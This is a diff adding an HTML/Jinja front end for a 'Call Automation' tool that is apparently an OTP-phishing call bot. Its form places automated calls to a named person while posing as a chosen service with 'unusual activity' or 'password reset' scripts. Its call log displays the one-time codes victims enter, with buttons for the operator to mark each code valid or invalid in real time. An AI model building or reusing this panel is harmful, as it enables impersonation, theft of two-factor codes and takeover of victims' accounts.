@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Call Automation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        #custom-message-container {
+            display: none;
+        }
+        .green-btn {
+            background-color: green;
+            color: white;
+            padding: 5px 10px;
+            border: none;
+            cursor: pointer;
+        }
+        .red-btn {
+            background-color: red;
+            color: white;
+            padding: 5px 10px;
+            border: none;
+            cursor: pointer;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            border: 1px solid #ccc;
+            padding: 10px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <h1>Call Automation</h1>
+
+    <form id="call-form">
+        <div class="form-group">
+            <label for="customer_name">Customer Name:</label>
+            <input type="text" id="customer_name" name="customer_name" required>
+        </div>
+        <div class="form-group">
+            <label for="customer_phone">Customer Phone:</label>
+            <input type="text" id="customer_phone" name="customer_phone" required>
+        </div>
+        <div class="form-group">
+            <label for="service_name">Service Name:</label>
+            <input type="text" id="service_name" name="service_name" required>
+        </div>
+        <div class="form-group">
+            <label for="message_type">Message Type:</label>
+            <select id="message_type" name="message_type" required>
+                <option value="unusual_activity">Unusual Activity</option>
+                <option value="password_reset">Password Reset</option>
+                <option value="custom">Custom</option>
+            </select>
+        </div>
+        <div class="form-group" id="custom-message-container">
+            <label for="custom_message">Custom Message:</label>
+            <textarea id="custom_message" name="custom_message" rows="3">
+Hello, {customer_name}. This is an automated message from {service_name}. We've received a request to reset your password. Please press 1 to continue.
+            </textarea>
+        </div>
+        <div class="form-group">
+            <label for="otp_length">OTP Length (Digits):</label>
+            <input type="number" id="otp_length" name="otp_length" value="6" required>
+        </div>
+        <button type="submit">Make Call</button>
+    </form>
+
+    <h2>Call Log</h2>
+    <table>
+        <tr>
+            <th>Call SID</th>
+            <th>Name</th>
+            <th>Status</th>
+            <th>OTP Code</th>
+            <th>OTP Input</th>
+            <th>Actions</th>
+        </tr>
+        {% for sid, details in call_log.items() %}
+        <tr>
+            <td>{{ sid }}</td>
+            <td>{{ details.name }}</td>
+            <td>{{ details.status }}</td>
+            <td>{{ details.otp }}</td>
+            <td>
+                <input type="text" id="otp_{{ sid }}" placeholder="Enter OTP">
+            </td>
+            <td>
+                <button class="green-btn" onclick="validateOTP('{{ sid }}', 'valid')">VALID</button>
+                <button class="red-btn" onclick="validateOTP('{{ sid }}', 'invalid')">INVALID</button>
+                <button onclick="endCall('{{ sid }}')">End Call</button>
+            </td>
+        </tr>
+        {% endfor %}
+    </table>
+
+    <script>
+        document.getElementById('message_type').addEventListener('change', function() {
+            if (this.value === 'custom') {
+                document.getElementById('custom-message-container').style.display = 'block';
+            } else {
+                document.getElementById('custom-message-container').style.display = 'none';
+            }
+        });
+
+        document.getElementById('call-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            fetch('/make_call', {
+                method: 'POST',
+                body: formData
+            }).then(response => response.json())
+              .then(data => {
+                  alert('Call initiated');
+              });
+        });
+
+        function validateOTP(call_sid, is_valid) {
+            const otp_input = document.getElementById('otp_' + call_sid).value;
+            fetch('/validate_code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ call_sid: call_sid, otp_input: otp_input, is_valid: is_valid })
+            }).then(response => response.json())
+              .then(data => {
+                  alert('OTP status updated');
+              });
+        }
+
+        function endCall(call_sid) {
+            fetch('/end_call', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ call_sid: call_sid })
+            }).then(response => response.json())
+              .then(data => {
+                  alert('Call ended');
+              });
+        }
+    </script>
+</body>
+</html>
